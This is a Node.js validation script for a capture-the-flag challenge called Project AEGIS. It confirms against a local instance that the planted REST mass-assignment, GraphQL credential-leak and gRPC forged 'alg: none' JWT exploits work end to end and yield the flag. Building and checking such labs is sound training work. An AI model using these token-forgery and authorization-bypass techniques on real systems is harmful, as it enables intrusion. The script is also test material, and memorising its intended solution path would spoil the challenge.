/**
 * Project AEGIS — Automated Validation Script
 *
 * Confirms, end to end, against a running instance of the challenge:
 *   1. Application starts successfully
 *   2. Required services are available (REST, GraphQL v1/v2, gRPC)
 *   3. Expected (legitimate) functionality works
 *   4. Each intended vulnerability exists and is exploitable
 *   5. The intended attack path works end to end
 *   6. The flag can be retrieved through the intended path
 *   7. (optional, --with-reset) reset functionality restores a clean state
 *
 * Usage:
 *   node validate.js                 # run all functional/vulnerability checks
 *   node validate.js --with-reset    # also exercises `docker compose restart`
 *
 * Exit code 0 = all checks passed. Exit code 1 = at least one check failed.
 */

const path = require('path');
const { execSync } = require('child_process');
const grpc = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');

const BASE_URL = process.env.AEGIS_BASE_URL || 'http://localhost:3000';
const GRPC_ADDR = process.env.AEGIS_GRPC_ADDR || '127.0.0.1:50051';
const PROTO_PATH = path.join(__dirname, 'src', 'grpc', 'admin_service.proto');

const results = [];
function record(name, pass, detail) {
  results.push({ name, pass, detail });
  console.log(`[${pass ? 'PASS' : 'FAIL'}] ${name}${detail ? ' - ' + detail : ''}`);
}

async function httpJson(method, urlPath, { token, body } = {}) {
  const headers = { 'Content-Type': 'application/json' };
  if (token) headers['Authorization'] = `Bearer ${token}`;
  const res = await fetch(BASE_URL + urlPath, {
    method,
    headers,
    body: body !== undefined ? JSON.stringify(body) : undefined
  });
  let data = null;
  try { data = await res.json(); } catch (e) { /* non-JSON body, ignore */ }
  return { status: res.status, data };
}

function forgeToken(claims) {
  const b64 = obj => Buffer.from(JSON.stringify(obj)).toString('base64url');
  return `${b64({ alg: 'none', typ: 'JWT' })}.${b64(claims)}.`;
}

function grpcClient() {
  const packageDef = protoLoader.loadSync(PROTO_PATH, {
    keepCase: false, longs: String, enums: String, defaults: true, oneofs: true
  });
  const proto = grpc.loadPackageDefinition(packageDef).aegis;
  return new proto.AdminService(GRPC_ADDR, grpc.credentials.createInsecure());
}

function grpcCall(client, method, token) {
  return new Promise(resolve => {
    const md = new grpc.Metadata();
    if (token) md.add('authorization', `Bearer ${token}`);
    client[method]({}, md, (err, res) => {
      resolve({ err: err ? { code: err.code, message: err.details || err.message } : null, res });
    });
  });
}

async function main() {
  // 1. Application starts successfully
  try {
    const res = await fetch(BASE_URL + '/');
    record('Application is reachable', res.status === 200, `status ${res.status}`);
  } catch (e) {
    record('Application is reachable', false, e.message);
    console.log('\nAborting further checks - application is not reachable.');
    process.exit(1);
  }

  // 2. Required services are available
  {
    const rest = await httpJson('POST', '/api/login', { body: { username: 'nope', password: 'nope' } });
    record('REST service responds', rest.status === 401, `status ${rest.status}`);

    const gqlV1 = await httpJson('POST', '/graph/v1', { body: { query: '{__typename}' } });
    record('GraphQL v1 service responds', gqlV1.status === 200, `status ${gqlV1.status}`);

    const gqlV2 = await httpJson('POST', '/graph/v2', { body: { query: '{__typename}' } });
    record('GraphQL v2 service responds', gqlV2.status === 200, `status ${gqlV2.status}`);
  }

  let client;
  try {
    client = grpcClient();
    const status = await grpcCall(client, 'GetSystemStatus', forgeToken({ role: 'employee' }));
    record('gRPC service responds', !!status.res, status.err ? status.err.message : 'ok');
  } catch (e) {
    record('gRPC service responds', false, e.message);
  }

  // 3. Expected (legitimate) functionality works
  const login = await httpJson('POST', '/api/login', { body: { username: 'alex', password: 'Winter2024!' } });
  record('Legitimate login works', login.status === 200 && !!login.data.token);
  const token = login.data && login.data.token;

  if (!token) {
    console.log('\nAborting further checks - could not obtain a valid session token.');
    process.exit(1);
  }

  // 4 + 5. Intended vulnerability exists and the attack path works: REST
  const restExploit = await httpJson('POST', '/api/profile/preferences', {
    token,
    body: { employee_id: 62, access_tier: 'administrator' }
  });
  record(
    'REST BOLA + Mass Assignment exploit succeeds',
    restExploit.status === 200 && !!(restExploit.data.security_notice),
    JSON.stringify(restExploit.data && restExploit.data.security_notice)
  );

  // GraphQL
  const gqlExploit = await httpJson('POST', '/graph/v1', {
    token,
    body: { query: '{ legacyCredentialResolver(username: "admin") { prefix migration_key } }' }
  });
  const gqlOk = gqlExploit.status === 200 &&
    gqlExploit.data.data &&
    gqlExploit.data.data.legacyCredentialResolver &&
    gqlExploit.data.data.legacyCredentialResolver.prefix === 'AEG';
  record('GraphQL BOLA exploit succeeds', gqlOk, JSON.stringify(gqlExploit.data));

  // Confirm the gate: gRPC must refuse the fragment before both prior stages are done in a
  // *fresh* run. In this script we run REST/GraphQL first, so we instead assert that a
  // forged non-admin token is correctly refused, then that the correctly-forged admin
  // token succeeds now that prerequisites are met.
  const nonAdminAttempt = await grpcCall(client, 'GetPasswordFragment', forgeToken({ role: 'employee' }));
  record(
    'gRPC correctly refuses a forged token without admin role',
    !!nonAdminAttempt.err && nonAdminAttempt.err.code === grpc.status.PERMISSION_DENIED
  );

  const grpcExploit = await grpcCall(client, 'GetPasswordFragment', forgeToken({ role: 'admin' }));
  record(
    'gRPC Broken Authentication exploit succeeds after prerequisites are met',
    !!grpcExploit.res && !!grpcExploit.res.fragment,
    grpcExploit.err ? grpcExploit.err.message : JSON.stringify(grpcExploit.res)
  );

  // 6. Flag can be retrieved through the intended path.
  // The flag is NOT exposed on /api/status - it only comes back from
  // /api/admin/dashboard, and only once all three stages are complete.
  // The intended path is: confirm all stages done -> log in as the real
  // admin account using the three recovered fragments concatenated
  // together (rest + graphql + grpc, matching the UI's password box
  // ordering) -> read the flag off the admin dashboard.
  const status = await httpJson('GET', '/api/status', { token });
  const stagesComplete = status.status === 200 &&
    status.data.rest_completed === true &&
    status.data.graphql_completed === true &&
    status.data.grpc_completed === true;
  record('All three vulnerability stages report complete', stagesComplete, JSON.stringify(status.data));

  let flagOk = false;
  let flagDetail = null;
  if (stagesComplete) {
    const combinedPassword = ['rest', 'graphql', 'grpc']
      .map(key => status.data.fragments[key])
      .join('');
    const adminLogin = await httpJson('POST', '/api/login', {
      body: { username: 'admin', password: combinedPassword }
    });
    if (adminLogin.status === 200 && adminLogin.data && adminLogin.data.token) {
      const dashboard = await httpJson('GET', '/api/admin/dashboard', { token: adminLogin.data.token });
      const flag = dashboard.data && dashboard.data.flag;
      flagOk = dashboard.status === 200 &&
        dashboard.data.verification_complete === true &&
        /^AEGIS\{.+\}$/.test(flag || '');
      flagDetail = flag || JSON.stringify(dashboard.data);
    } else {
      flagDetail = `admin login failed with recovered password: ${JSON.stringify(adminLogin.data)}`;
    }
  }
  record('Full flag retrieved via admin login + dashboard', flagOk, flagDetail);

  // 7. Optional: reset functionality
  if (process.argv.includes('--with-reset')) {
    try {
      execSync('docker compose restart', { stdio: 'inherit', cwd: __dirname });
      await new Promise(r => setTimeout(r, 3000));
      const afterReset = await fetch(BASE_URL + '/');
      const loginAfter = await httpJson('POST', '/api/login', { body: { username: 'alex', password: 'Winter2024!' } });
      const statusAfter = await httpJson('GET', '/api/status', { token: loginAfter.data && loginAfter.data.token });
      const clean = afterReset.status === 200 &&
        statusAfter.data &&
        statusAfter.data.rest_completed === false &&
        statusAfter.data.graphql_completed === false &&
        statusAfter.data.grpc_completed === false;
      record('Reset restores a clean initial state', clean, JSON.stringify(statusAfter.data));
    } catch (e) {
      record('Reset restores a clean initial state', false, e.message);
    }
  }

  const failed = results.filter(r => !r.pass);
  console.log(`\n${results.length - failed.length}/${results.length} checks passed.`);
  process.exit(failed.length ? 1 : 0);
}

main().catch(e => {
  console.error('Validation script crashed:', e);
  process.exit(1);
});
